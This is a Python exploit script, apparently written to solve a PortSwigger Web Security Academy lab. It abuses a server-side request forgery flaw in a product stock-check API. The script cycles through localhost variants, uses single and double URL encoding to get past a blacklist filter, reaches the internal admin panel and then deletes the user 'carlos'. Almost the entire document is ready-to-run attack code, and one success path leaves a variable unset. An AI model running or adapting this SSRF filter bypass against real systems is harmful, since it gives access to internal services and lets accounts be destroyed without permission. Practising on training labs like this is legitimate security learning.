#!/usr/bin/python3

import requests
import sys

def ssrf(url, api, endpoint):

    for i in open("localhost.txt", "r"):

        i = i.rstrip('\n')

        target = f"{i}/{endpoint}"

        data = {
            "stockApi" : f"http://{target}",
        }

        r = requests.post(url + api, data = data)

        print(f"[INFO] Trying: http://{target}")

        if "/admin/delete" in r.text:
            print(f"[INFO] SSRF to admin page access granted: {target}")
            print(r.text)
            break
        else:
            target_urlEncode = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in target)

            data = {
                "stockApi" : f"http://{target_urlEncode}",
            }

            r = requests.post(url + api, data = data)

            print(f"[INFO] Trying: http://{target_urlEncode}")

            if "/admin/delete" in r.text:
                print(f"[INFO] SSRF to admin page access granted (URL Encoded): {target}")
                #print(r.text)
                break

            else:
                target_urlDoubleEncode = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in target_urlEncode)

                data = {
                    "stockApi" : f"http://{target_urlDoubleEncode}",
                }

                r = requests.post(url + api, data = data)

                print(f"[INFO] Trying: http://{target_urlDoubleEncode}")

                if "/admin/delete" in r.text:
                    print(f"[INFO] SSRF to admin page access granted (URL Double-Encoded): {target}")
                    #print(r.text)
                    break

                else:
                    target_endpointEncode = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in endpoint)

                    data = {
                        "stockApi" : f"http://{i}/{target_endpointEncode}",
                    }

                    r = requests.post(url + api, data = data)

                    print(f"[INFO] Trying: http://{i}/{target_endpointEncode}")

                    if "/admin/delete" in r.text:
                        print(f"[INFO] SSRF to admin page access granted (Endpoint URL Encoded): {target}")
                        payload = f"{i}/{target_endpointEncode}"
                        #print(r.text)
                        break

                    else:
                        pass

    return payload

def deleteUser(url, api, foundUrl):

    username = "carlos"

    data = {
        "stockApi" : f"http://{foundUrl}/delete?username={username}"
    }

    r = requests.post(url + api, data = data)
    
    if r.status_code == 401:
        print(f"[INFO] Successfully deleted the user: {username}")
    else:
        foundUrl_ip = foundUrl.split("/")[0]
        foundUrl_endpoint = foundUrl.split("/")[1]
        foundUrl_encode = "".join("%{0:0>2}".format(format(ord(char), "x")) for char in foundUrl_endpoint)
        foundUrl_final = foundUrl_ip + "/" + foundUrl_encode

        print(foundUrl_final)

        data = {
            "stockApi" : f"http://{foundUrl_final}/delete?username={username}"
        }

        r = requests.post(url + api, data = data)

        if r.status_code == 401:
            print(f"[INFO] Successfully deleted the user (Endpoint Double Encoded): {username}")
        else:
            print("[ERROR] Something went wrong!")
            print(r.text)
            sys.exit(1)

if __name__ == '__main__':
    url = "https://ac0c1f501fb50951c0f8412c002900df.web-security-academy.net"
    api = "/product/stock"
    endpoint = "admin"
   
    foundUrl = ssrf(url, api, endpoint)
    deleteUser(url, api, foundUrl)